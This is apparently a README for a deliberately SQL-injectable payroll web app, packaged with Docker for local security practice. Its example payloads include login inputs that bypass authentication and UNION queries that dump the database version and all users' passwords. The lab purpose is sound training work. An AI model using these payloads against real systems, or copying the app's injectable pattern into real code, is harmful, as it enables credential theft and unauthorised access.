# startrek_payroll

A simple SQL injection vulnerable web application powered by Docker

## Project Summary

This is a simple web application that is vulnerable to SQL injection attacks. The web application is based on the `payroll_app` from the [Metasploitable3 project](https://github.com/rapid7/metasploitable3), and the PHP code is taken (almost) directly from that project. The primary contribution of this project is a Docker environment using docker-compose and consisting of Nginx, PHP and MySQL containers to run the web application easily.

## Project Instructions

Install the project requirements on your choice of operating system, including:

- Docker
- Docker Compose plugin

Run using either of the following:

- `make run`
- `docker compose up --build`

Open web browser and visit:

- `localhost:8080`

Clean the Docker environment (after making changes):

- `make clean`

## Example Payloads

1. Normal login to get users salary:
    - `username`: `james_kirk`
    - `password`: `kobayashi_maru`

2. Dump username and salary of all users:
    - `username`: `' OR 1=1#`
    - `password`: `anythingyouwant`

3. Dump MySQL version:
    - `username`: `' UNION SELECT null,@@version#`
    - `password`: `anythingyouwant`

4. Dump all users passwords:
    - `username`: `' UNION SELECT username,password FROM users#`
    - `password`: `anythingyouwant`
